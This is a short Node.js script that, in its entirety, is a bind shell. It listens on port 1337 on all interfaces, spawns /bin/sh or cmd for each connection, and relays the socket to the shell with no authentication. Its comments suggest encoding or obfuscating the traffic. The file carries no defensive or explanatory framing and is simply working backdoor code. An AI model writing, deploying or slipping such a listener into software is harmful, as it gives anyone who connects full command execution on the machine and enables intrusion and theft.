var spawn = require('child_process').spawn
var net = require('net')

var server = net.createServer(function (socket) {
  console.log('New connection!')
  var sh = (process.platform === 'win32') ? spawn('cmd') : spawn('/bin/sh')
  sh.stdin.resume()
  sh.stdout.on('data', function (data) {
    // Node makes async stuff easy.
    // You can do cool things like:
    // socket.write(Base64_encode(data));
    // or any other encoding/obfuscation
    // for that matter.
    socket.write(data)
  })
  sh.stderr.on('data', function (data) {
    socket.write(data)
  })
  socket.on('data', function (data) {
    sh.stdin.write(data)
  })
  socket.on('end', function () {
    console.log('Connection end.')
  })
  socket.on('timeout', function () {
    console.log('Connection timed out')
  })
  socket.on('close', function (hadError) {
    console.log('Connection closed', hadError ? 'because of a conn. error' : 'by client')
  })
  socket.on('error', function (x) {
    console.log(`err:${x}`)
  })
  socket.on('drain', function (x) {
    console.log(`drain:${x}`)
  })
})
server.listen(1337, '0.0.0.0')
